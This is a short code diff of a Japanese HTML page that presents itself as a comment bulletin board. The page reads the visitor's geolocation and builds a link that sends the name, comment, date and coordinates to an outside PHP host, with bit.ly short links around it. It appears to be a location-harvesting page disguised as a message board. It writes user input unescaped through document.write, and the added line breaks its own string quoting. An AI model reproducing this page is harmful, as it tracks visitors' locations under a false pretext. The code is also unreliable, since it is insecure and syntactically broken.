@@ -1,6 +1,6 @@
 <html lang="ja">
 <head>
-<title>hyu掲示板</title>
+<title>掲示板</title>
 <meta charset="UTF-8" />
 <script type="text/javascript">
 
@@ -23,12 +23,12 @@ window.parent.document.body.style.zoom = Ftsize;
 <h1>コメント</h1>
 <input type="text" id="text" class="textdate">
 <br><br>
-<input type="button" value="送信" onClick="test()">
+<input type="button" value="許可して送信" onClick="test()">
 <br>
-<input type="button" value="許可しない場合はこちらから" onClick="noon()">
+<input type="button" value="許可しないで送信" onClick="noon()">
 
 <br><br>
-    <button id="button">使えない場所の場合のurlコピー</button>
+    <button id="button">urlコピー</button>
 <textarea id="textarea" rows="3" readonly>https://bit.ly/2XG5llW</textarea>
 <br><br>
 <a href="https://bit.ly/2FotoeN"><img src="http://yumaabckhh.php.xdomain.jp/line.png" width="482" height="241"></a>
@@ -59,7 +59,7 @@ navigator.geolocation.getCurrentPosition( (position) => {
 });
 function displayData(lat, lng, accu){
 
-document.write("<h1>名前</h1><br>" + name + "<br><h1>コメント</h1>" + text);
+document.write("<body bgcolor="white"></body><h1>名前</h1><br>" + name + "<br><h1>コメント</h1>" + text);
 document.write("<br><br><a href=http://yumaabckhh.php.xdomain.jp/h.php?name=" + name + "&text=" + text + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">確定</a>");
 }
 }
